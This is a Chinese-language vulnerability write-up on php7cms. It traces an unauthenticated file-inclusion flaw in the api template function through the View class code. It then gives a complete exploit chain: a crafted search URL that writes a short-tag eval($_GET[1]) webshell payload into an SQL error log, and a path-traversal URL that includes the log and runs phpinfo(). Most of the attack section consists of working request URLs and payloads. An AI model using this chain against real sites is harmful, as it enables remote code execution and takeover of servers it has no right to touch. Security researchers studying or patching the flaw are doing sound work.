# php7cms文件包含漏洞

## 漏洞描述

php7cms前台未授权文件包含 利用SQL注入报错插入payload到日志文件 包含该日志文件得到webshell

## 漏洞影响

> php7cms

## 漏洞分析

## 利用思路

1. 前台未授权文件包含
2. 利用SQL注入报错插入payload到日志文件
3. 包含该日志文件得到webshell

在php7cms/Core/Controllers/Api/Api.php:143

```php
public function template() {
        ob_start();
        \Phpcmf\Service::V()->display(dr_safe_replace(\Phpcmf\Service::L('Input')->get('name')));
        $html = ob_get_contents();
        ob_clean();
        $this->_jsonp(1, $html);
    }
```

该函数动态调用模板的函数，是可以通过构造url来访问到的。

该函数接收一个参数name。并将该值带入到了display函数中，跟踪该函数。

php7cms/Fcms/Core/View.php:137

```php
 public function display($_name, $_dir = '') {
        extract($this->_options, EXTR_PREFIX_SAME, 'data');
        $this->_filename = $_name;
        !IS_DEV && $this->_options = null;
        // 加载编译后的缓存文件
        $this->_disp_dir = $_dir;
        $_view_file = $this->get_file_name($_name);
        $_view_name = str_replace([TPLPATH, FCPATH, APPSPATH], '', $_view_file);
        \Config\Services::timer()->start($_view_name);
        include $this->load_view_file($_view_file);
        \Config\Services::timer()->stop($_view_name);
        // 消毁变量
        $this->_include_file = null;
    }
这里的$_name被带入到了get_file_name函数中。跟踪该函数:
public function get_file_name($file, $dir = null, $include = FALSE) {
        $dir = $dir ? $dir : $this->_disp_dir;
        if (IS_ADMIN || $dir == 'admin' || $this->_is_admin) {
            // 后台操作时，不需要加载风格目录，如果文件不存在可以尝试调用主项目模板
            if (APP_DIR && is_file(MYPATH.'View/'.APP_DIR.'/'.$file)) {
                return MYPATH.'View/'.APP_DIR.'/'.$file;
            } elseif (!APP_DIR && is_file(MYPATH.'View/'.$file)) {
                return MYPATH.'View/'.$file;
            } elseif (is_file($this->_dir.$file)) {
                return $this->_dir.$file; // 调用当前后台的模板
            } elseif (is_file($this->_aroot.$file)) {
                return $this->_aroot.$file; // 当前项目目录模板不存在时调用主项目的
            } elseif ($dir != 'admin' && is_file(APPSPATH.ucfirst($dir).'/Views/'.$file)) {
                return APPSPATH.ucfirst($dir).'/Views/'.$file; // 指定模块时调用模块下的文件
            }
            $error = $this->_dir.$file;
        } elseif (IS_MEMBER || $dir == 'member') {
            // 会员操作时，需要加载风格目录，如果文件不存在可以尝试调用主项目模板
            if ($dir === '/' && is_file($this->_root.$file)) {
                return $this->_root.$file;
            } elseif (is_file($this->_dir.$file)) {
                // 调用当前的会员模块目录
                return $this->_dir.$file;
            } elseif (is_file($this->_mroot.$file)) {
                // 调用默认的会员模块目录
                return $this->_mroot.$file;
            } elseif (is_file($this->_root.$file)) {
                // 调用网站主站模块目录
                return $this->_root.$file;
            }
            $error = $dir === '/' ? $this->_root.$file : $this->_dir.$file;
        } elseif ($file == 'go') {
            // 转向字段模板
            return $this->_aroot.'go.html';
        } else {
            if ($dir === '/' && is_file($this->_root.$file)) {
                // 强制主目录
                return $this->_root.$file;
            } else if (@is_file($this->_dir.$file)) {
                // 调用本目录
                return $this->_dir.$file;
            } else if (@is_file($this->_root.$file)) {
                // 再次调用主程序下的文件
                return $this->_root.$file;
            }
            $error = $dir === '/' ? $this->_root.$file : $this->_dir.$file;
        }
        // 如果移动端模板不存在就调用主网站风格
        if (IS_MOBILE && is_file(str_replace('/mobile/', '/pc/', $error))) {
            return str_replace('/mobile/', '/pc/', $error);
        } elseif (IS_MOBILE && is_file(str_replace('/mobile/', '/pc/', $this->_root.$file))) {
            return str_replace('/mobile/', '/pc/', $this->_root.$file);
        } elseif ($file == 'msg.html' && is_file(TPLPATH.'pc/default/home/msg.html')) {
            return TPLPATH.'pc/default/home/msg.html';
        }
        exit('模板文件 ('.str_replace(TPLPATH, '/', $error).') 不存在');
    }
```

该函数是用来判断模板文件是否存在。由于文件名可控。导致我们可以通过../这样来跳转目录来使用其他我们可控的文件。

然后判断完毕文件存在后，回到上文。

```
 include $this->load_view_file($_view_file);
```

这里将路径带入到了load_view_file函数中，并将返回结果include。看一下这个load_view_file函数:

```php
  public function load_view_file($name) {
        $cache_file = $this->_cache.str_replace(array(WEBPATH, '/', '\\', DIRECTORY_SEPARATOR), array('', '_', '_', '_'), $name).(IS_MOBILE ? '.mobile.' : '').'.cache.php';
        // 当缓存文件不存在时或者缓存文件创建时间少于了模板文件时,再重新生成缓存文件
        if (!is_file($cache_file) || (is_file($cache_file) && is_file($name) && filemtime($cache_file) < filemtime($name))) {
            $content = $this->handle_view_file(file_get_contents($name));
            @file_put_contents($cache_file, $content, LOCK_EX) === FALSE && show_error('请将模板缓存目录（/cache/template/）权限设为777', 404, '无写入权限');
        }
        return $cache_file;
    }
```

这里会将我们传入的文件路径的文件内容写入到缓存文件中，并返回该缓存文件的文件路径。

文件包含的点在这里，那么如何找到可控内容的文件就比较重要的。

这里我使用该网站自带的错误日志来进行包含。

首先我们访问：

````
http://localhost/index.php?s=news&c=search&keyword=%E5%9B%BA%E5%AE%9A&order=2%3C?=/*&sss=*/e val($_GET[1]);`
````

这样就会生成一个错误日志cache/error/log-2018-10-20.php

命名规则就是log-年-月-日.php

看一下这个文件的内容：

```
<?php defined('B ASEPATH') OR exit('No direct s cript access allowed'); ?>

ERROR - 2018-10-20 16:53:04 --> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?=/* LIMIT 0,10' at line 1<br>SELECT `dr_1_news`.`thumb`,`dr_1_news`.`url`,`dr_1_news`.`title`,`dr_1_news`.`des cription`,`dr_1_news`.`keywords`,`dr_1_news`.`updatetime`,`dr_1_news`.`hits`,`dr_1_news`.`comments` FROM `dr_1_news` WHERE (`dr_1_news`.`id` IN(SELECT `cid` FROM `dr_1_news_search_index` WHERE `id`="ce0f2ef8f63c9afa7453492781553547")) AND `dr_1_news`.`status` = 9 ORDER BY 2<?=/* LIMIT 0,10<br>http://localhost/index.php?s=news&c=search&keyword=%E5%9B%BA%E5%AE%9A&order=2%3C?=/*&sss=*/e val($_GET[1]);
```

因为程序对<?php这种有过滤，所以这里采用短标签+注释符来执行代码。

然后我们将这个日志文件包含进来。

访问如下url。

```
http://10.3.0.22/index.php?s=api&c=api&m=template&name=../../../../cache/error/log-2020-09-30.php&1=phpinfo();
```

即可执行phpinfo

![1](/_v_images/php7cms文件包含/1.png)